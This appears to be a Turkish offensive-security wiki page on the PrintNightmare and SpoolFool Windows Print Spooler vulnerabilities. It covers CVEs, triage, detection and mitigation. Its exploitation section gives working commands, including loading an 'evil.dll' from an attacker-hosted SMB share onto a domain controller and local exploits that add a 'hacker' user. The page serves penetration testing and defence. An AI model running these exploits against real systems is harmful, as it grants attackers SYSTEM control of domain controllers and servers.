# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare, Windows **Print Spooler** hizmetindeki **SYSTEM olarak keyfi kod yürütmeye** ve spooler'a RPC üzerinden erişilebildiğinde **etki alanı denetleyicilerinde ve dosya sunucularında uzaktan kod yürütmeye (RCE)** olanak tanıyan bir dizi güvenlik açığına verilen ortak addır. En çok istismar edilen CVE'ler **CVE-2021-1675** (başlangıçta LPE olarak sınıflandırıldı) ve **CVE-2021-34527**'dir (tam RCE). **CVE-2021-34481 (“Point & Print”)** ve **CVE-2022-21999 (“SpoolFool”)** gibi sonraki sorunlar, saldırı yüzeyinin hâlâ tamamen kapatılmadığını kanıtlıyor.

**Driver tabanlı RCE/LPE** yerine spooler üzerinden **kimlik doğrulama zorlama / relay** arıyorsanız, [printer coercion abuse hakkındaki bu diğer sayfaya](printers-spooler-service-abuse.md) bakın. Bu sayfa, **SYSTEM olarak driver / DLL yüklemeye** odaklanmaktadır.

---

## 1. Güvenlik açığı bulunan bileşenler ve CVE'ler

| Yıl | CVE | Kısa ad | İlkel | Notlar |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Haziran 2021 CU'da yamalandı ancak CVE-2021-34527 ile aşıldı|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`, kimliği doğrulanmış kullanıcıların uzak bir paylaşımdan driver DLL yüklemesine olanak tanır; Ağustos 2021 sonrasında bu işlem genellikle zayıflatılmış Point & Print ilkeleri gerektirir|
|2021|CVE-2021-34481|“Point & Print”|LPE|Yönetici olmayan kullanıcıların imzasız driver yüklemesi|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Keyfi dizin oluşturma → DLL yerleştirme – 2021 yamalarından sonra da çalışır|

Bunların tümü, **MS-RPRN / MS-PAR RPC yöntemlerinden** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) birini veya **Point & Print** içindeki güven ilişkilerini istismar eder.

## 2. Exploitation teknikleri

### 2.1 Uzak Etki Alanı Denetleyicisini ele geçirme (CVE-2021-34527)

Kimliği doğrulanmış ancak **ayrıcalıklı olmayan** bir etki alanı kullanıcısı, aşağıdaki yöntemle uzak bir spooler'da (çoğunlukla DC) **NT AUTHORITY\SYSTEM** olarak keyfi DLL'ler çalıştırabilir:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popüler PoC’ler arasında **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) ve **mimikatz** içindeki Benjamin Delpy’ye ait `misc::printnightmare / lsa::addsid` modülleri bulunur.

### 2.2 Yerel ayrıcalık yükseltme (desteklenen tüm Windows sürümleri, 2021-2024)

Aynı API, `C:\Windows\System32\spool\drivers\x64\3\` konumundan bir driver yüklemek ve SYSTEM ayrıcalıkları elde etmek için **yerel olarak** çağrılabilir:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Yama uygulanmış sistemlerde modern triage

Tamamen güncel bir hostta, Windows artık yazıcı sürücülerinin yüklenmesini varsayılan olarak **yalnızca yöneticilerle** sınırlandırdığı için (10 Ağustos 2021'den beri `RestrictDriverInstallationToAdministrators=1`), herkese açık PrintNightmare PoC'leri genellikle başarısız olur. Bir hedefe exploit uygulamadan önce, ortamın eski yazıcı dağıtımları için bu güvenlik değişikliğini geri alıp almadığını kontrol edin:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

En ilginç zayıf değerler genellikle şunlardır:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bir PoC çalıştırmadan önce, hedefin ilgili print RPC arayüzlerini sunduğunu Linux üzerinden hızlıca doğrulayın:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Bazı daha yeni herkese açık araçlar, bir DLL göndermeden önce daha güvenli bir **kontrol/listeleme** iş akışı da sunar:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Düşük ayrıcalıklı bir kullanıcı olarak `RPC_E_ACCESS_DENIED` (`0x8001011b`) alıyorsanız, genellikle bir aktarım hatasından ziyade 2021 sonrası varsayılan davranışı görüyorsunuzdur.

> Windows 11 22H2+ ve daha yeni istemci sürümlerinde, uzak yazdırma varsayılan olarak **RPC over TCP** kullanır; **RPC over named pipes** (`\PIPE\spoolss`) ise açıkça yeniden etkinleştirilmedikçe devre dışıdır. Bazı eski PoC’ler ve laboratuvar notları hâlâ named pipe’ın erişilebilir olduğunu varsayıyor.<sup>[[4]](#references)</sup>

### 2.4 “Yamalı” ağlarda Package Point & Print kötüye kullanımı

Birçok kurumsal ortam, yardım masası veya yazdırma sunucusu iş akışları yönetici olmayan kullanıcıların sürücü yüklemesini/güncellemesini gerektirdiğinden, 2021’deki ilk yamalardan sonra da **politika gereği savunmasız** kaldı. Uygulamada saldırı planı şu hâle gelir:

- Güvenlik istemleri tamamen devre dışıysa, **klasik keyfi DLL yüklemeli PrintNightmare** hâlâ en kısa yoldur.
- `Only use Package Point and Print` etkinse, genellikle ham DLL bırakmak yerine **imzalı, paket uyumlu bir sürücü** yoluna geçmeniz gerekir.<sup>[[3]](#references)</sup>
- 2024 araştırması, **`Package Point and Print - Approved servers` ayarının tek başına kesin bir güven sınırı olmadığını** gösterdi: Saldırgan onaylı bir yazdırma sunucusu için ad çözümlemesini taklit edebilir veya ele geçirebilirse, kurbanlar politika denetimlerini karşılayan kötü amaçlı bir sunucuya yönlendirilebilir.<sup>[[4]](#references)</sup>
- UNC sağlamlaştırmasını zorunlu RPC-over-SMB ile birleştirmek bile güvenilmez olabilir; çünkü modern istemciler **RPC over TCP’ye geri dönebilir**.<sup>[[4]](#references)</sup>

Modern PrintNightmare tarzı istismarların, 2021’deki özgün PoC’yi değiştirmeden yeniden çalıştırmaktan çok **kurumsal yazıcı dağıtım politikasını kötüye kullanmaya** dayanmasının nedeni budur.

### 2.5 SpoolFool (CVE-2022-21999) – 2021 düzeltmelerini atlatma

Microsoft’un 2021 yamaları uzaktan sürücü yüklemesini engelledi, ancak **dizin izinlerini güçlendirmedi**. SpoolFool, `SpoolDirectory` parametresini kötüye kullanarak `C:\Windows\System32\spool\drivers\` altında keyfi bir dizin oluşturur, bir payload DLL bırakır ve spooler’ı bu DLL’yi yüklemeye zorlar:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Exploit, Şubat 2022 güncellemelerinden önce tamamen güncel Windows 7 → Windows 11 ve Server 2012R2 → 2022 sürümlerinde çalışır<sup>[[2]](#references)</sup>

---

## 3. Tespit ve avcılık

* **PrintService günlükleri** – *Microsoft-Windows-PrintService/Operational* kanalını etkinleştirin ve başarılı ya da başarısız tüm denemelerde **Event ID 316** (sürücü eklendi/güncellendi; genellikle DLL adlarını içerir) olayını izleyin. Şüpheli spooler modülü/sürücü yükleme hataları için bunu **Event ID 808/811** ile birlikte değerlendirin.
* **Sysmon** – üst süreç **spoolsv.exe** olduğunda `C:\Windows\System32\spool\drivers\*` içinde `Event ID 7` (görüntü yüklendi) veya `11/23` (dosya yazma/silme) olaylarını izleyin.
* **Süreç soy ağacı** – **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell veya beklenmeyen, imzasız herhangi bir alt süreç başlattığında uyarı oluşturun.
* **Ağ telemetrisi** – **spoolsv.exe** tarafından saldırganın kontrolündeki paylaşımlara yapılan beklenmeyen SMB erişimleri veya yazdırma sunucusu olarak çalışmaması gereken sunuculardan gelen olağandışı yazıcı RPC trafiği, yüksek sinyalli ipuçlarıdır.

## 4. Azaltma ve güçlendirme

1. **Yama uygulayın!** – Print Spooler hizmetinin yüklü olduğu tüm Windows ana bilgisayarlarına en güncel toplu güncellemeyi yükleyin.
2. **Gerekli olmadığı yerlerde spooler'ı devre dışı bırakın**, özellikle de Domain Controller'larda:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Yerel yazdırmaya izin verirken uzak bağlantıları engelleyin** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print'i yalnızca yöneticilere açık tutun**; şu ayarı yapın:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Ayrıntılı yönergeler Microsoft KB5005652<sup>[[1]](#references)</sup>
5. İş gereksinimleri `RestrictDriverInstallationToAdministrators=0` ayarını zorunlu kılıyorsa, diğer tüm yazıcı ilkelerini yalnızca **kısmi azaltımlar** olarak değerlendirin. En azından **package-aware drivers** kullanmayı tercih edin, **Only use Package Point and Print** ayarını etkinleştirin ve **Package Point and Print - Approved servers** ayarını açıkça belirtilen, orman içindeki yazdırma sunucularıyla kısıtlayın.<sup>[[3]](#references)</sup>
6. Bozuk yazıcı eşlemelerini düzeltmek için **printer RPC privacy** ayarını geri almayın. `RpcAuthnLevelPrivacyEnabled=0` ayarını yapan ortamlar, **CVE-2021-1678** için eklenen hardening'i geri alıyor demektir ve genellikle bir engagement sırasında daha yakından incelenmelidir.<sup>[[4]](#references)</sup>

---

## 5. İlgili araştırmalar / araçlar

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modülleri
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list` ve `-delete` modlarına sahip standart Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – yerleşik SMB delivery, multi-target desteği ve hem `MS-RPRN` hem de `MS-PAR` modlarını içeren wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print üzerinden kendi savunmasız yazıcı driver'ını kullanma
* SpoolFool exploit ve write-up
* SpoolFool ve diğer spooler bug'ları için 0patch micropatches

Driver yüklemek yerine spooler üzerinden **kimlik doğrulamayı zorlamak** istiyorsanız [printer spooler service abuse](printers-spooler-service-abuse.md) bölümüne geçin.

---

## References

- [1] [Microsoft – KB5005652: Yeni Point & Print varsayılan driver yükleme davranışını yönetme](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024'te PrintNightmare için Pratik Bir Kılavuz](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare Henüz Bitmedi](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
